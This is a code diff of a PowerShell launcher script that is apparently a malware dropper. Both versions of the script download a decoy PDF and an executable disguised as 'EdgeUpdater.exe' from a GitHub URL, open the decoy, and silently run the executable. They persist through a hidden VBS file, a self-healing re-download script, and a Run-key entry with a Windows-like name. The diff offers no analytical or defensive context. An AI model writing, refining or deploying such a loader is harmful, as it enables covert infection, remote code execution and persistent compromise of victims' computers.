@@ -1,9 +1,9 @@
-# launcher.ps1 - LAST ATTEMPT: ultra-simple VBS + Run key with forced quotes
+# FINAL MINIMAL launcher.ps1 - clean Run key + single VBS
 $ErrorActionPreference = 'SilentlyContinue'
 
-$persistBase = "$env:APPDATA\Microsoft\Windows\Libraries"
 $cache = "$env:APPDATA\Microsoft\Windows\Caches"
-New-Item -ItemType Directory -Path $persistBase,$cache -Force | Out-Null
+$persist = "$env:APPDATA\Microsoft\Windows\Libraries"
+New-Item -ItemType Directory -Path $cache,$persist -Force | Out-Null
 
 $pdfUrl = "https://raw.githubusercontent.com/astro-opensource/cloud-sync-tools/1b8f22c806de43fe97c6cd555f455d166591d54d/assets/Nakaz_No._661_vid_02.03.2026.pdf"
 $exeUrl = "https://raw.githubusercontent.com/astro-opensource/cloud-sync-tools/main/assets/EdgeUpdater.exe"
@@ -11,52 +11,36 @@ $exeUrl = "https://raw.githubusercontent.com/astro-opensource/cloud-sync-tools/m
 $pdfPath = "$cache\doc.pdf"
 $exePath = "$cache\helper.exe"
 
-$headers = @{'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
+Invoke-WebRequest -Uri $pdfUrl -OutFile $pdfPath -UseBasicParsing
+Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UseBasicParsing
 
-# Drop files
-Invoke-WebRequest -Uri $pdfUrl -OutFile $pdfPath -Headers $headers -UseBasicParsing
-Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -Headers $headers -UseBasicParsing
+if (Test-Path $pdfPath) { Start-Process $pdfPath -Verb Open }
 
-# Open PDF
-if (Test-Path $pdfPath) { 
-    Start-Process $pdfPath -Verb Open 
-}
+Start-Sleep -Seconds 30
 
-Start-Sleep -Seconds (Get-Random -Min 20 -Max 45)
-
-# Initial launch
 $wsh = New-Object -ComObject WScript.Shell
 $wsh.Run("`"$exePath`"", 0, $false)
 
-# Persistence - simple as fuck
-$randName = "CacheLib-$(Get-Random -Min 100000 -Max 999999)"
-$vbsPath = "$persistBase\$randName.vbs"
-$syncPath = "$persistBase\$randName.ps1"
+# Single clean persistence
+$vbsPath = "$persist\update.vbs"
+$syncPath = "$persist\sync.ps1"
 
-# VBS with rock-solid quoting
-$vbsContent = 'Set WshShell = CreateObject("WScript.Shell")' + "`r`n"
-$vbsContent += 'WshShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -NonInteractive -File ""' + $syncPath + '""", 0, False'
-$vbsContent | Out-File -FilePath $vbsPath -Encoding ASCII -Force
+$vbs = 'Set WshShell = CreateObject("WScript.Shell")' + "`r`nWshShell.Run ""powershell.exe -NoProfile -ExecutionPolicy Bypass -NonInteractive -File `"$syncPath`""" , 0, False"
+$vbs | Out-File $vbsPath -Encoding ASCII -Force
 
-# Sync script - self healing + launch
-$syncContent = @"
-`$ErrorActionPreference = 'SilentlyContinue'
-Start-Sleep -Milliseconds (Get-Random -Min 8000 -Max 15000)
-`$exeUrl = "$exeUrl"
-`$exePath = "$exePath"
-if (-not (Test-Path `$exePath)) {
-    Invoke-WebRequest -Uri `$exeUrl -OutFile `$exePath -Headers @{'User-Agent'='Mozilla/5.0'} -UseBasicParsing
-}
-Get-Process -Name "*helper*" -ErrorAction SilentlyContinue | Stop-Process -Force
-Start-Sleep -Milliseconds 4000
+$sync = @"
+`$exeUrl = `"$exeUrl`"
+`$exePath = `"$exePath`"
+Start-Sleep -Seconds (Get-Random -Min 8 -Max 15)
+if (-not (Test-Path `$exePath)) { Invoke-WebRequest -Uri `$exeUrl -OutFile `$exePath -UseBasicParsing }
 `$wsh = New-Object -ComObject WScript.Shell
 `$wsh.Run("`"`$exePath`"", 0, `$false)
 "@
-$syncContent | Out-File -FilePath $syncPath -Encoding UTF8 -Force
+$sync | Out-File $syncPath -Encoding UTF8 -Force
 
-# Register in Run key
+# Register ONLY ONE entry
 $runKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-Set-ItemProperty -Path $runKey -Name $randName -Value "wscript.exe `"$vbsPath`"" -Type String -Force
+Set-ItemProperty -Path $runKey -Name "WindowsCacheUpdater" -Value "wscript.exe `"$vbsPath`"" -Type String -Force
 
-# Fire once now
+# Fire once
 Start-Process wscript.exe -ArgumentList "`"$vbsPath`"" -WindowStyle Hidden
